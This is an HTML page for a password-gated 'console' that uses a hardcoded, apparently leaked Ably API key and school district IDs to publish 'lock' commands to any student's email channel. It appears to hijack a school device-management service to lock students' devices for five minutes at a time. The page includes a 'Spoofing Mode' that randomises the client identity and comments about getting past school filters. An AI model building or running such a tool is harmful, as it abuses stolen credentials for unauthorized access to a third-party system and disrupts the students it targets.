<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shhhh.. ðŸ¤«</title>
    <script src="https://cdn.ably.com/lib/ably.min-1.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #f89e3d; --accent: #8b5cf6; --bg: #020617; --card: rgba(15, 23, 42, 0.9); --text: #f8fafc; --success: #10b981; --error: #ef4444; }
        * { box-sizing: border-box; transition: all 0.3s ease; }
        body { font-family: 'Poppins', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        #auth-screen { text-align: center; width: 100%; max-width: 400px; }
        .glass-card { background: var(--card); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; padding: 35px; width: 100%; max-width: 550px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
        .hidden { display: none !important; }
        .nav-menu { display: flex; background: rgba(0,0,0,0.5); border-radius: 16px; padding: 4px; margin-bottom: 25px; }
        .nav-item { flex: 1; text-align: center; padding: 10px; cursor: pointer; border-radius: 12px; font-size: 0.8rem; font-weight: 600; color: #64748b; }
        .nav-item.active { background: var(--accent); color: white; }
        .master-container { background: rgba(255,255,255,0.03); padding: 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; }
        .master-label { font-weight: 600; font-size: 1rem; color: #94a3b8; display: flex; align-items: center; gap: 10px; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #334155; }
        .status-dot.online { background: var(--success); box-shadow: 0 0 10px var(--success); }
        .status-dot.offline { background: var(--error); }
        .feature-item { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
        .feature-info { flex: 1; padding-right: 15px; }
        .feature-title { font-size: 0.85rem; font-weight: 600; display: block; }
        .feature-desc { font-size: 0.65rem; color: #64748b; }
        h1 { font-size: 2.2rem; text-align: center; margin: 0 0 20px 0; background: linear-gradient(to right, var(--primary), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        input { width: 100%; padding: 14px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; color: white; margin-bottom: 15px; outline: none; }
        button { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 600; cursor: pointer; color: white; background: var(--accent); }
        .console-box { font-family: monospace; font-size: 0.65rem; height: 100px; overflow-y: auto; background: #000; padding: 10px; border-radius: 12px; color: #10b981; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); line-height: 1.4; }
        .switch { position: relative; display: inline-block; width: 44px; height: 22px; flex-shrink: 0; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; border-radius: 50%; }
        input:checked + .slider { background-color: var(--accent); }
        input:checked + .slider:before { transform: translateX(22px); }
    </style>
</head>
<body>

<div id="auth-screen">
    <h1>shhhh.. ðŸ¤«</h1>
    <input type="password" id="passkey" placeholder="Access Key">
    <button onclick="login()">Enter Console</button>
</div>

<div id="dashboard" class="glass-card hidden">
    <h1>shhhh.. ðŸ¤«</h1>
    <div class="nav-menu">
        <div class="nav-item active" onclick="tab('main')">Control</div>
        <div class="nav-item" onclick="tab('stealth')">Stealth</div>
    </div>

    <div id="panel-main">
        <div class="master-container" id="master-box">
            <div class="master-label">
                <div id="dot" class="status-dot"></div>
                <span id="master-text">Network: Disconnected</span>
            </div>
            <label class="switch">
                <input type="checkbox" id="kill-switch" onchange="toggleSystem()">
                <span class="slider"></span>
            </label>
        </div>
        <div id="control-fields" style="opacity: 0.4; pointer-events: none;">
            <input type="email" id="email" placeholder="student@school.edu">
            <button onclick="executeAction()">ðŸš€ Execute Broadcast</button>
        </div>
    </div>

    <div id="panel-stealth" class="hidden">
        <label>Live Handshake Diagnostics</label>
        <div id="live-log" class="console-box">> System Standing By...</div>
        <div class="feature-item">
            <div class="feature-info">
                <span class="feature-title">Spoofing Mode</span>
                <span class="feature-desc">Changes identity on reconnect.</span>
            </div>
            <label class="switch"><input type="checkbox" id="tog-incog" onchange="initSystem()"><span class="slider"></span></label>
        </div>
    </div>
    <div id="status-bar" style="margin-top: 20px; text-align: center; font-size: 0.75rem;"></div>
</div>

<script>
    // These keys must be exactly correct. Check for trailing spaces!
    const KEY = '1k1Wbw.G52kOXvb7p7UbwFRV3ahn74m6xklosio2XUdLlTL'; 
    const DISTRICTS = ['60-7576-A000', '74-1335-F000', '60-8732-A000']; 
    let ably = null;

    function login() {
        if(document.getElementById('passkey').value === "shhhh") {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            log("Authenticated. Toggle Link to start.", "#64748b");
        } else { alert("Access Denied"); }
    }

    function tab(name) {
        document.getElementById('panel-main').classList.toggle('hidden', name !== 'main');
        document.getElementById('panel-stealth').classList.toggle('hidden', name !== 'stealth');
        document.querySelectorAll('.nav-item').forEach(i => i.classList.toggle('active', i.innerText.toLowerCase() === name));
    }

    function initSystem() {
        const isIncog = document.getElementById('tog-incog').checked;
        const cid = isIncog ? "anon-" + Math.random().toString(36).substr(2,4) : "adm-" + Math.random().toString(36).substr(2,6);
        
        if (ably) ably.close();
        
        // CHECK: Is the Ably library actually loaded?
        if (typeof Ably === 'undefined') {
            log("CRITICAL ERROR: Ably Library not found. Check internet/firewall.", "var(--error)");
            return;
        }

        try {
            log("Initializing Ably connection...", "var(--accent)");
            
            // Re-formatted initialization to solve "invalid key"
            ably = new Ably.Realtime({
                key: KEY.trim(),
                clientId: cid,
                tls: true, // Force encryption
                useBinaryProtocol: false // Sometimes helps with school filters
            });
            
            ably.connection.on('connected', () => {
                document.getElementById('dot').className = "status-dot online";
                document.getElementById('master-text').innerText = "Network: Active";
                log("Handshake Complete. Link Live.", "var(--success)");
            });

            ably.connection.on('failed', (err) => {
                document.getElementById('dot').className = "status-dot offline";
                log("Connection Failed: " + (err.reason ? err.reason.message : "Check Key"), "var(--error)");
            });

            ably.connection.on('disconnected', () => {
                document.getElementById('dot').className = "status-dot";
                log("Network Disconnected.", "var(--error)");
            });

        } catch(e) { 
            log("Init Error: " + e.message, "var(--error)"); 
            console.error(e);
        }
    }

    function toggleSystem() {
        const isActive = document.getElementById('kill-switch').checked;
        const fields = document.getElementById('control-fields');
        if(isActive) {
            initSystem();
            fields.style.opacity = "1"; fields.style.pointerEvents = "all";
        } else {
            if(ably) ably.close();
            document.getElementById('dot').className = "status-dot";
            document.getElementById('master-text').innerText = "Network: Disconnected";
            fields.style.opacity = "0.4"; fields.style.pointerEvents = "none";
            log("Link Severed.", "var(--error)");
        }
    }

    async function executeAction() {
        const mail = document.getElementById('email').value;
        if(!mail || !ably) return log("Target/Link missing.", "var(--error)");
        
        log("Broadcasting lock signal...", "var(--accent)");
        DISTRICTS.forEach(id => {
            const chan = ably.channels.get(`user:${mail}`);
            chan.publish('lock', { 
                action: 'lock', 
                data: { customerId: id, type: 'lock', lockExpiration: Date.now() + 300000 } 
            }, (err) => {
                if(err) log("Publish Failed: " + err.message, "var(--error)");
                else log("Signal accepted by ID: " + id, "var(--success)");
            });
        });
    }

    function log(m, c) {
        document.getElementById('status-bar').innerText = m;
        document.getElementById('status-bar').style.color = c;
        const l = document.getElementById('live-log');
        const t = new Date().toLocaleTimeString([], {hour12:false, hour:'2-digit', minute:'2-digit', second:'2-digit'});
        l.innerHTML += `<br>[${t}] ${m}`;
        l.scrollTop = l.scrollHeight;
    }
</script>
</body>
</html>
